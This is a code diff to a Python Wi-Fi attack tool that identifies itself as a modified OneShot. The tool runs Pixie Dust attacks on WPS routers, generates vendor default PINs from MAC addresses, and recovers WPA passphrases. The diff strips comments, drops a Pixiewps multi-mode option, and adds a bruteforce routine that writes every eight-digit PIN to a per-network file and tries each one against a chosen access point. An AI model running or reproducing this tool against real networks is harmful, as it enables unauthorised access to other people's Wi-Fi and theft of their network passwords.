@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 import sys
 import subprocess
 import os
@@ -294,7 +293,6 @@ class WPSpin:
                       'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                       'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                       'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
-                      # Static pin algos
                       'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                       'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                       'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
@@ -468,9 +466,7 @@ class WPSpin:
         return mac.integer % 0x100000000
 
     def pinDLink(self, mac):
-        # Get the NIC part
         nic = mac.integer & 0xFFFFFF
-        # Calculating pin
         pin = nic ^ 0x55AA55
         pin ^= (((pin & 0xF) << 4) +
                 ((pin & 0xF) << 8) +
@@ -546,7 +542,7 @@ class PixiewpsData:
 
 class ConnectionStatus:
     def __init__(self):
-        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
+        self.status = ''
         self.last_m_message = 0
         self.essid = ''
         self.wpa_psk = ''
@@ -561,7 +557,7 @@ class BruteforceStatus:
     def __init__(self):
         self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.mask = ''
-        self.last_attempt_time = time.time()   # Last PIN attempt start time
+        self.last_attempt_time = time.time()
         self.attempts_times = collections.deque(maxlen=15)
 
         self.counter = 0
@@ -595,7 +591,6 @@ class Companion:
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
-        self.pixie_another_method = False
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -630,7 +625,6 @@ class Companion:
         cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-        # Waiting for wpa_supplicant control interface initialization
         while True:
             check_exit()
             ret = self.wpas.poll()
@@ -762,7 +756,7 @@ class Companion:
 
         return True
 
-    def __runPixiewps(self, full_range=False, try_other_methods=False):
+    def __runPixiewps(self, full_range=False):
         self.__print_with_indicators('*', 'Running Pixiewps…')
         base_cmd = self.pixie_creds.get_pixie_cmd(full_range)
 
@@ -782,8 +776,8 @@ class Companion:
             return None
 
         pin = _run(base_cmd)
-        if pin or not try_other_methods:
-            return pin or False
+        if pin:
+            return pin
         for mode in range(1, 8):
             pin = _run(f"{base_cmd} --mode {mode}")
             if pin:
@@ -853,7 +847,7 @@ class Companion:
             verbose = self.print_debug
         self.pixie_creds.clear()
         self.connection_status.clear()
-        self.wpas.stdout.read(300)   # Clean the pipe
+        self.wpas.stdout.read(300)
         self.bssid = (bssid or '').lower()
         if pbc_mode:
             if bssid:
@@ -893,7 +887,6 @@ class Companion:
         if pin is None:
             if pixiemode:
                 try:
-                    # Try using the previously calculated PIN
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
@@ -904,7 +897,6 @@ class Companion:
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
             elif not pbc_mode:
-                # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
         if pbc_mode:
             self.__wps_connection(bssid, pbc_mode=pbc_mode)
@@ -918,7 +910,6 @@ class Companion:
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
             if not pbc_mode:
-                # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 try:
                     os.remove(filename)
@@ -927,7 +918,7 @@ class Companion:
             return True
         elif pixiemode:
             if self.pixie_creds.got_all():
-                pin = self.__runPixiewps(pixieforce, self.pixie_another_method)
+                pin = self.__runPixiewps(pixieforce)
                 if pin:
                     while True:
                         if self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True):
@@ -941,7 +932,6 @@ class Companion:
                 return False
         else:
             if store_pin_on_fail:
-                # Saving Pixiewps calculated PIN if can't connect
                 self.__savePin(bssid, pin)
             return False
 
@@ -994,7 +984,6 @@ class Companion:
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None):
         if (not start_pin) or (len(start_pin) < 4):
-            # Trying to restore previous session
             try:
                 filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                 with open(filename, 'r') as file:
@@ -1129,18 +1118,14 @@ class WiFiScanner:
                 if res:
                     handler(line, res, networks)
 
-        # Filtering non-WPS networks
         networks = list(filter(lambda x: bool(x['WPS']), networks))
         if not networks:
             return False
 
-        # Sorting by signal level
         networks.sort(key=lambda x: x['Level'], reverse=True)
 
-        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
         network_list = {(i + 1): network for i, network in enumerate(networks)}
 
-        # Printing scanning results as table
         def truncateStr(s, length, postfix="…"):
             """Truncate string to fit display width"""
             original_width = _str_width(s)
@@ -1408,23 +1393,76 @@ def try_pin_sequence(comp, bssid, pins, pixie=False, delay=None):
 
 
 def try_bruteforce_file(comp, bssid, path, delay=None):
+    filename = None
     for p in [path, os.path.join(os.path.dirname(__file__), path)]:
-        try:
-            with open(p, 'r') as f:
-                for line in f:
-                    pin = line.strip()
-                    if not pin or pin in TRIED_PINS:
-                        continue
-                    TRIED_PINS.add(pin)
-                    if comp.single_connection(bssid, pin):
-                        return True
-                    if delay:
-                        time.sleep(delay)
-            return False
-        except Exception as e:
-            last = e
-    print(f"[!] Failed to open bruteforce file: {last}")
-    return False
+        if os.path.exists(p):
+            filename = p
+            break
+    if not filename:
+        print(f"[!] Failed to open bruteforce file: {path}")
+        return False
+    while True:
+        with open(filename, 'r') as f:
+            pin = f.readline().strip()
+            if not pin:
+                print('[-] No more pins left')
+                return False
+        if pin in TRIED_PINS:
+            with open(filename, 'r+') as f:
+                f.readline()
+                rest = f.read()
+                f.seek(0)
+                f.write(rest)
+                f.truncate()
+            continue
+        print(f"[*] WPS Pin: {pin} (bruteforce)")
+        TRIED_PINS.add(pin)
+        success = comp.single_connection(bssid, pin)
+        with open(filename, 'r+') as f:
+            f.readline()
+            rest = f.read()
+            f.seek(0)
+            f.write(rest)
+            f.truncate()
+        if success:
+            return True
+        if delay:
+            time.sleep(delay)
+
+
+def bruteforce_all_pins(comp, bssid, ssid=None, delay=None):
+    filename = f"{bssid.replace(':', '').upper()}_{(ssid or 'UNKNOWN').replace(' ', '_')}.pins"
+    if not os.path.exists(filename):
+        with open(filename, 'w') as f:
+            for i in range(100000000):
+                f.write(f"{i:08d}\n")
+    while True:
+        with open(filename, 'r') as f:
+            pin = f.readline().strip()
+            if not pin:
+                print('[-] No more pins left')
+                return False
+        if pin in TRIED_PINS:
+            with open(filename, 'r+') as f:
+                f.readline()
+                rest = f.read()
+                f.seek(0)
+                f.write(rest)
+                f.truncate()
+            continue
+        print(f"[*] WPS Pin: {pin} (bruteforce)")
+        TRIED_PINS.add(pin)
+        success = comp.single_connection(bssid, pin)
+        with open(filename, 'r+') as f:
+            f.readline()
+            rest = f.read()
+            f.seek(0)
+            f.write(rest)
+            f.truncate()
+        if success:
+            return True
+        if delay:
+            time.sleep(delay)
 
 def build_parser():
     parser = argparse.ArgumentParser(description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg', epilog='Example: %(prog)s --interface wlan0 --bssid 00:90:4C:C1:AC:21 --pixie-dust')
@@ -1433,8 +1471,7 @@ def build_parser():
     parser.add_argument('--pin', type=str, help='Use the specified pin (arbitrary string or 4/8 digit pin)')
     parser.add_argument('--pixie-dust', action='store_true', help='Run Pixie Dust attack')
     parser.add_argument('--pixie-force', action='store_true', help='Run Pixiewps with --force option (bruteforce full range)')
-    parser.add_argument('--pixie-another-method', action='store_true', help='Try additional Pixiewps modes if default fails')
-    parser.add_argument('--bruteforce-pins', nargs='?', const=True, help='Bruteforce all pins when no file is given, otherwise try PINs from the specified file')
+    parser.add_argument('--bruteforce-pins', nargs='?', const=True, help='Bruteforce all pins with progress saved per network when no file is given, otherwise try PINs from the specified file')
     parser.add_argument('--push-button-connect', action='store_true', help='Run WPS push button connection')
     parser.add_argument('--delay', type=float, help='Set the delay between pin attempts')
     parser.add_argument('--write', action='store_true', help='Write credentials to the file on success')
@@ -1463,7 +1500,6 @@ if __name__ == '__main__':
     while True:
         check_exit()
         companion = Companion(args.interface, args.write, print_debug=args.verbose)
-        companion.pixie_another_method = args.pixie_another_method
         if args.push_button_connect:
             companion.single_connection(pbc_mode=True)
         else:
@@ -1479,7 +1515,6 @@ if __name__ == '__main__':
                     essid = network.get('ESSID')
             if args.bssid:
                 companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                companion.pixie_another_method = args.pixie_another_method
                 if args.pin:
                     companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
                 else:
@@ -1501,7 +1536,8 @@ if __name__ == '__main__':
                                                     if not try_bruteforce_file(companion, args.bssid, args.bruteforce_pins, delay=args.delay):
                                                         print('[-] All PIN attempts failed')
                                                 elif args.bruteforce_pins is True:
-                                                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                                                    print('[*] Bruteforcing all pins...')
+                                                    bruteforce_all_pins(companion, args.bssid, essid, delay=args.delay)
                                                 else:
                                                     print('[-] All PIN attempts failed')
         if not args.loop:
